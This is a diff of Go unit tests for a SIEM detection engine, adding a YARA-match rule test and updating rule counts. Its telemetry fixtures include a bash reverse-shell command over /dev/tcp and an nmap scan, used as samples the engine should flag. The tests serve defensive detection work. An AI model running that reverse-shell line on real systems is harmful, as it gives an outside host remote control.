@@ -33,8 +33,8 @@ func TestDefaultRulesParse(t *testing.T) {
 	if err != nil {
 		t.Fatalf("DefaultRules: %v", err)
 	}
-	if len(rules) != 3 {
-		t.Fatalf("got %d default rules, want 3", len(rules))
+	if len(rules) != 4 {
+		t.Fatalf("got %d default rules, want 4", len(rules))
 	}
 	// Compiling them should not error.
 	e := NewSigmaEngine(fakeSource{}, rules, nil)
@@ -49,10 +49,10 @@ func TestEngineDetections(t *testing.T) {
 		t.Fatal(err)
 	}
 	records := []telemetry.Record{
-		proc(map[string]string{"name": "evil", "path": "/tmp/evil", "cmdline": "/tmp/evil"}),          // temp-exec (high)
+		proc(map[string]string{"name": "evil", "path": "/tmp/evil", "cmdline": "/tmp/evil"}),                              // temp-exec (high)
 		proc(map[string]string{"name": "bash", "path": "/bin/bash", "cmdline": "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1"}), // revshell (critical) + dev/tcp
-		proc(map[string]string{"name": "nmap", "path": "/usr/bin/nmap", "cmdline": "nmap -sS 10.0.0.0/24"}),  // offensive (medium)
-		proc(map[string]string{"name": "ls", "path": "/usr/bin/ls", "cmdline": "ls -la"}),               // benign
+		proc(map[string]string{"name": "nmap", "path": "/usr/bin/nmap", "cmdline": "nmap -sS 10.0.0.0/24"}),               // offensive (medium)
+		proc(map[string]string{"name": "ls", "path": "/usr/bin/ls", "cmdline": "ls -la"}),                                 // benign
 	}
 
 	e := NewSigmaEngine(fakeSource{records: records}, base, nil)
@@ -96,6 +96,44 @@ loop:
 	}
 	if got["siembox-offensive-tool"] != models.SeverityMedium {
 		t.Errorf("offensive severity = %q, want medium", got["siembox-offensive-tool"])
+	}
+}
+
+func TestYaraEventFires(t *testing.T) {
+	base, err := DefaultRules()
+	if err != nil {
+		t.Fatal(err)
+	}
+	rec := telemetry.Record{
+		Query:     "yara_events",
+		Action:    "added",
+		Columns:   map[string]string{"path": "/tmp/dropped.bin", "matches": "SIEMBox_YARA_SelfTest", "count": "1"},
+		Timestamp: time.Now(),
+	}
+	e := NewSigmaEngine(fakeSource{}, base, nil)
+	if err := e.LoadRules(nil); err != nil {
+		t.Fatal(err)
+	}
+	events := e.Evaluate(context.Background(), []telemetry.Record{rec})
+
+	var found *models.Event
+	for i := range events {
+		if events[i].RuleID == "siembox-yara-file-match" {
+			found = &events[i]
+			break
+		}
+	}
+	if found == nil {
+		t.Fatalf("yara_events record did not fire siembox-yara-file-match; got %d events", len(events))
+	}
+	if found.Severity != models.SeverityHigh {
+		t.Errorf("yara match severity = %q, want high", found.Severity)
+	}
+	if found.Source != "osquery:yara_events" {
+		t.Errorf("source = %q, want osquery:yara_events", found.Source)
+	}
+	if found.Fields["matches"] != "SIEMBox_YARA_SelfTest" {
+		t.Errorf("matches field = %v", found.Fields["matches"])
 	}
 }
 
